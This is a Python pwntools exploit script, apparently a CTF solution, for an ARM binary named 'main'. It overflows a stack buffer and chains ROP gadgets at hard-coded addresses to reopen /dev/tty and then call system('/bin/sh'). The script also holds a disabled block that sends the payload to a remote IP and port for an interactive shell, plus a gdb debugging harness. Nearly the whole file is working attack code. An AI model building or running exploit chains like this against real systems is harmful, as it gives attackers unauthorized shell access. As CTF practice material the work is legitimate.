#!/usr/bin/env python3
from pwn import *
import os

context.binary = "./main"

# rops
rop_r1_t_adr = 0x0004407c  # ; pop {r1, pc} !thumb
rop_mov_r0_r8_t_adr = 0x00020ca8  # ; mov r0,r8 / add sp,#0x8 / pop.w {r4, r5, r6, r7, r8, r9, r10, pc}
rop_add_sp_0xc_t_adr = 0x000147b4  # ; add sp,0xc / pop {r4, r5, r6, r7, pc}
rop_add_r0_r4_t_adr = 0x0002602a  # ; add r0, r4 / pop {r4, pc}

rop_lr_adr = 0x0003df1c  # ; pop {r4, r6, r7, fp, ip, lr, pc}
rop_bx_lr_adr = 0x00018108  # ; bx lr
rop_mov_r0_r1_t_adr = 0x00025a24  # ; mov r0 r1 / bx lr

rop_open_t_adr = 0x00026c2c  # open
rop_system_t_adr = 0x000111fc  # system
rop_sice_t_adr = 0x00010440  # sice

rop_set_r0_t_adr = 0x00014d88 # ; pop {r0, r6, pc}

location_bin_sh = 0x0004a3b4  # string "/bin/sh"
location_date = 0x0004a2e0  # string "date +'%s'"

elf = ELF(context.binary.path)
rop = ROP(elf)
#rop.call("open", [b"/dev/tty"])

"""
What I want to have

This is a bit complicated actually, but essentially I can jump recursevly into pop instructions and fill my buffers with such

Open question is how I get control over the stack to inject my /dev/tty or similar

Okay. Helpful:
  - r8 seems to be set to the stackpointer at a known and stable offset from sp. 
    Assumption is 364 bytes after sp in func vuln
  - so overwrite stuff in r8
  - then r0 needs to be set to r8
    - see addr 0x00020ca8
       0x00020ca8               4046  mov r0, r8
       0x00020caa               02b0  add sp, 8
       0x00020cac           bde8f087  pop.w {r4, r5, r6, r7, r8, sb, sl, pc}
  - call open

non thumb:
  0x0003df1c : pop {r4, r6, r7, fp, ip, lr, pc}
    - doesn't pop r8, but sets lr and pc

"""

def build_lr(r4, r6, r7, fp, ip, lr):
    payload = p32(rop_lr_adr)
    payload += p32(r4) + p32(r6) + p32(r7) + p32(fp) + p32(ip)
    payload += p32(lr)
    return payload

def build_mov_r0_r8_t(r4, r5, r6, r7, r8, r9, r10):
    payload = p32(rop_mov_r0_r8_t_adr + 1)
    payload += b"0" * 8
    payload += p32(r4) + p32(r5) + p32(r6) + p32(r7) + p32(r8) + p32(r9) + p32(r10)
    return payload

def mov_r0_r1_t(pc):
    payload = build_lr(0, 0, 0, 0, 0, pc)
    payload += p32(rop_mov_r0_r1_t_adr + 1)
    return payload

def call_open_t(next_pc):
    # set lr to next instruction after open
    payload = build_lr(0, 0, 0, 0, 0, next_pc)
    payload += p32(rop_open_t_adr + 1)  # do open once
    return payload

def build_set_r0(r0, r6):
    payload = p32(rop_set_r0_t_adr + 1)
    payload += p32(r0) + p32(r6)
    return payload


if True:
    tty_path = b"/dev/tty\x00"
    #tty_path = b"/dev/pts/9\x00"

    payload = b"0" * 0x20
    payload += b"1" * 4

    # trying to execute rop_r1_t_adr in thumb mode
    payload += build_lr(0, 0, 0, 0, 0, rop_r1_t_adr + 1)
    payload += p32(rop_bx_lr_adr)

    # write to r1
    payload += p32(os.O_RDONLY)

    r4_overflow = 0xFFFFFFFF - (len(tty_path) + 2) + 1  # overflow provocing
    # move r8 to r0
    payload += build_mov_r0_r8_t(r4_overflow, 0, 0, 0, 0, 0, 0)

    # subtract from r0
    payload += p32(rop_add_r0_r4_t_adr + 1)
    payload += p32(0)  # r4

    # do open
    payload += call_open_t(rop_add_sp_0xc_t_adr + 1)

    # open uses 16bytes of stack, reserve it
    payload += b"0" * 0xc

    # move r1 to r0 and set r1 = O_RDRW
    payload += b"0" * (4 * 4) # for add sp
    payload += mov_r0_r1_t(rop_r1_t_adr + 1)
    payload += p32(os.O_WRONLY)

    payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
    # open uses 16bytes of stack, reserve it
    payload += b"0" * 0xc
    payload += b"0" * (4 * 4)  # for add sp

    payload += mov_r0_r1_t(rop_r1_t_adr + 1)
    payload += p32(os.O_WRONLY)

    payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
    # open uses 16bytes of stack, reserve it
    payload += b"0" * 0xc
    payload += b"0" * (4 * 4)  # for add sp

    # NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
    payload += build_set_r0(location_bin_sh, 0)
    payload += p32(rop_system_t_adr + 1)
    assert len(payload) < (404 - len(tty_path) - 2)
    payload += b"0" * (404 - len(payload) - len(tty_path) - 2)

    payload += tty_path
    print(f"Payload Length: 0x{len(payload):x}")
else:
    payload = b"0" * 0x192
    # with 0x200 bytes calls to system don't resolve
    ...
with open("/local-tmp/payload", "bw") as fp:
    fp.write(payload + b"\n")
    fp.write(b"ls")

exit()

if False:
    r = remote("34.125.56.151", 2222, ssl=False)
    r.sendline(payload)
    r.interactive()
    exit()

io = gdb.debug(context.binary.path, gdbscript="""
source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
# b vuln
b *0x00026c2c
b *0x0004407c
b *0x111fc
# b *0x000104da
c
""")
io.sendline(payload)
io.interactive()
